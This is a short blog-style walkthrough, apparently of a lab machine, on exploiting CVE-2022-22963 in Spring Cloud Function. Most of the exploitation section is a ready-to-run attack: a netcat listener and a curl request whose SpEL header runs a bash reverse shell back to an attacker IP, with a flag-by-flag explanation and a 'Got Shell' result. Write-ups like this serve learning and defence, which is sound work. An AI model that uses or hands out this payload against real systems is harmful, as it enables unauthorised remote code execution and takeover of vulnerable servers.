# Initial Access 101: Exploiting ****CVE-2022-22963**** Vulnerability

## Introduction

I was practicing and learning when I encountered a new vulnerability. I discovered a vulnerability called 'Local File Inclusion' (LFI) in a web application. During my exploration, I found a file named pom.xml, which I was unaware of, So after somre research i found out that it is an XML file that contains information about the project and configuration details used by Maven to build the project. 

Looking through the content of file and searching on google about the spring framework boot exploit, after researching i found a poc on github for **CVE-2022-22963.**

### **CVE-2022-22963:**

In Spring Cloud Function versions 3.1.6, 3.2.2 and older unsupported versions, when using routing functionality it is possible for a user to provide a specially crafted SpEL as a routing-expression that may result in remote code execution and access to local resources.

References:

https://0x1.gitlab.io/exploit/SpringBoot-RCE/ 

https://github.com/me2nuk/CVE-2022-22963

https://nvd.nist.gov/vuln/detail/CVE-2022-22963

## Exploitation:

Starting the listener. 

```bash
nc -lvnp 443
```

Running the payload which will call back to my machine.

```bash
curl -X POST http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/bash","-c","exec /bin/bash -i &>/dev/tcp/10.10.16.3/443 <&1"})' --data-raw 'data' -v
```
**Explaination**:

- The **`-H`** flag is used to specify a header for the request. In this case, it's setting the **`spring.cloud.function.routing-expression`** header to a specific value.

- The value of the header is a Spring Expression Language (SpEL) expression. It uses the **`T()`** notation to call a specific Java class and invoke a method. In this case, it's calling **`java.lang.Runtime.getRuntime().exec()`**.

- The **`exec()`** method is used to execute a command on the operating system. The command being executed is **`/bin/bash -c 'exec /bin/bash -i &>/dev/tcp/10.10.16.3/443 <&1'`**. This command is attempting to establish a reverse shell connection

- The `--data-raw` flag specifies the raw data that will be included in the request body. In this case, it's set to 'data'.

- The -v flag is used to enable verbose mode, which provides more detailed output during the request.


![p](https://github.com/Strange-0/initialaccess101/assets/76517909/366c8103-c0f3-401b-ab34-2b67e8589aba)

Got Shell

![i](https://github.com/Strange-0/initialaccess101/assets/76517909/13752b75-9f82-4241-8839-e11099bea890)
